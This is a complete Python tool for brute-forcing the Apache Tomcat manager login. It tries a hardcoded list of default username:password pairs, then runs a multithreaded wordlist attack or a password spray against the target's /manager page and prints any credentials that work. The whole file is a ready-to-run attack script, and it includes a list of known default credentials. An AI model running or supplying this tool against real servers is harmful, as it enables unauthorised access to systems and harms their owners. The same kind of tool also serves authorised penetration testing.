#!/usr/bin/python3
#
# Author: anavrinsec
#
# License: MIT
#
# Brute force Tomcat login

import argparse
import requests
import threading
import concurrent.futures
from termcolor import colored, cprint

parser = argparse.ArgumentParser(description="Apache tomcat login brute force")
parser.add_argument("wordlist", help="wordlist file")
parser.add_argument("url", help="url/ip of the target")
parser.add_argument("-P", "--port", help="port tomcat is running on. (default: 8080)", default="8080")
parser.add_argument("-t", "--threads", help="number of threads to use. (default: 16)", type=int, default=16)
parser.add_argument("-u", "--username", help="username to use for brute forcing. (default: admin)", default="admin")
parser.add_argument("-p", "--password", help="password used for spray. (default: password123)", default="password123")
parser.add_argument("-s", "--spray", help="Use option to password spray against usernames. (default: false)", action="store_true")
args = parser.parse_args()

# Default credentials taken from SecLists tomcat-betterdefaultpasslist.txt
default_credentials = ["admin:", "admin:admanager", "admin:admin", "ADMIN:ADMIN", "admin:adrole1", "admin:adroot", "admin:ads3cret"]
default_credentials += ["admin:adtomcat", "admin:advagrant", "admin:password", "admin:password1", "admin:Password1", "admin:tomcat", "admin:vagrant"]
default_credentials += ["both:admanager", "both:admin", "both:adrole1", "both:adroot", "both:ads3cret", "both:adtomcat", "both:advagrant", "both:tomcat"]
default_credentials += ["cxsdk:kdsxc", "j2deployer:j2deployer", "manager:admanager", "manager:admin", "manager:adrole1", "manager:adroot", "manager:ads3cret"]
default_credentials += ["manager:adtomcat", "manager:advagrant", "manager:manager", "ovwebusr:OvW*busr1", "QCC:QLogic66", "role1:admanager", "role1:admin"]
default_credentials += ["role1:adrole1", "role1:adroot", "role1:ads3cret", "role1:adtomcat", "role1:advagrant", "role1:role1", "role1:tomcat", "role:changethis"]
default_credentials += ["root:admanager", "root:admin", "root:adrole1", "root:adroot", "root:ads3cret", "root:adtomcat", "root:advagrant", "root:changethis"]
default_credentials += ["root:owaspbwa", "root:password", "root:password1", "root:Password1", "root:r00t", "root:root", "root:toor", "tomcat:", "tomcat:admanager"]
default_credentials += ["tomcat:admin", "tomcat:adrole1", "tomcat:adroot", "tomcat:ads3cret", "tomcat:adtomcat", "tomcat:advagrant", "tomcat:changethis"]
default_credentials += ["tomcat:password", "tomcat:password1", "tomcat:s3cret", "tomcat:tomcat", "xampp:xampp", "server_admin:owaspbwa", "admin:owaspbwa", "demo:demo"]

# Global variables
URL = f"http://{args.url}:{args.port}/manager"
found_credentials = []
is_found = False

def check_default_credentials():
    '''CHeck for default credentials'''

    cprint('[INFO] ', 'blue', end='')
    print('Checking for default credentials.')

    found = False

    for creds in default_credentials:

        res = requests.get(URL, auth=tuple(creds.split(':')))

        if res.status_code != 401:

            found = True

            cprint('[+] ', 'green', end='')

            cprint(creds, 'green')

            found_credentials.append(tuple(creds.split(':')))

    if not found:

        cprint('[-] No default credentials found.', 'red')



class Wordlist:

    def __init__(self):
        self._lock = threading.Lock()
        self._generator = self._generator_function()
        self._filename = args.wordlist
        self._word = ''
        self.count = 0


    def getWord(self):

        with self._lock:
            self._word = next(self._generator)
            self.count += 1
            if self.count >= 1000 and self.count % 1000 == 0:
                cprint('[INFO] ', 'blue', end='')
                print(f"{self.count} <username|password> have been checked")

        return self._word



    def _generator_function(self):

        for word in open(self._filename, 'r'):
            yield word.strip()



save_credentials_lock = threading.Lock()

def save_credentials(credentials):

    global save_credentials_lock

    with save_credentials_lock:

        if credentials not in found_credentials:
            found_credentials.append(credentials)



is_found_true_lock = threading.Lock()

def set_is_found_true():

    global is_found
    global is_found_true_lock

    with is_found_true_lock:
        is_found = True


def send_request(obj):

    found = False

    while not found:

        try:
            word = obj.getWord()

        except StopIteration:
            break

        if args.spray:
            authorization = (word, args.password)

        else:
            authorization = (args.username, word)

        response = requests.get(URL, auth=authorization)

        if response.status_code != 401:
            save_credentials(authorization)
            cprint("[+] Found credentials: " + authorization[0] + ":" + authorization[1], 'green')

            if not args.spray:
                found = True
                set_is_found_true()

        global is_found

        if is_found: break # If password is found, all threads are stopped.




if __name__ == "__main__":

    print("\nApache Tomcat Login Bruteforce\n")
    cprint("[INFO] ", "blue", end='')
    print(f"url: {URL}")
    cprint("[INFO] ", "blue", end='')
    print(f"port: {args.port}")
    cprint("[INFO] ", "blue", end='')
    print(f"wordlist: {args.wordlist}")
    cprint("[INFO] ", "blue", end='')
    print(f"username: {args.username}")
    cprint("[INFO] ", "blue", end='')
    print(f"password: {args.password}")
    cprint("[INFO] ", "blue", end='')
    print(f"threads: {args.threads}")
    cprint("[INFO] ", "blue", end='')
    print(f"password spray: {args.spray}\n")


    check_default_credentials()

    cprint("[INFO] ", "blue", end='')
    print("Starting brute force attack...")

    wordlist_obj = Wordlist()

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:

        for i in range(args.threads):

            executor.submit(send_request, wordlist_obj)

    if len(found_credentials) > 0:

        cprint("[+] Success! The following credentials were found:", "green")

        for cred in found_credentials:

            cprint(cred[0] + ":" + cred[1], "green")

    else:

        cprint("No credentials were found", "red")


